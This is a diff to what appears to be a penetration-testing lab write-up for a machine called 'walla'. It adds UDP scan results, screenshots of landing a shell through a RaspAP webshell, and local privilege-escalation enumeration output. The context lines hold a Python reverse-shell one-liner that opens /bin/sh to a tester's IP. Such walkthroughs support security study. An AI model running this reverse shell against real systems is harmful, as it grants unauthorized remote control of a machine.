@@ -59,6 +59,11 @@ Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Enumerated UDP ports:
 
 ```
+PORT     STATE         SERVICE  VERSION
+53/udp   open|filtered domain
+67/udp   open|filtered dhcps
+631/udp  open|filtered ipp
+5353/udp open|filtered zeroconf
 ```
 
 Notes:
@@ -101,19 +106,31 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 .168.49.66",42042));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Utilizing exploit to craft us a reverse shell!</p></figcaption></figure>
+
+* Or you could simply use revshells
+
+{% embed url="https://www.revshells.com/" %}
+
 <figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>RaspAP Webshell</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>We catch a shell!</p></figcaption></figure>
-
-
-
-## Name of the technique
-
-This is the exploit
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Landed as www-data</p></figcaption></figure>
 
 ## Privilege Escalation
 
+Sudo -l Enumeration:
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Interesting file</p></figcaption></figure>
+
 ### Local enumeration
+
+```
+/etc/mysql/mariadb.cnf
+
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)
+```
 
 ### PrivEsc vector
 
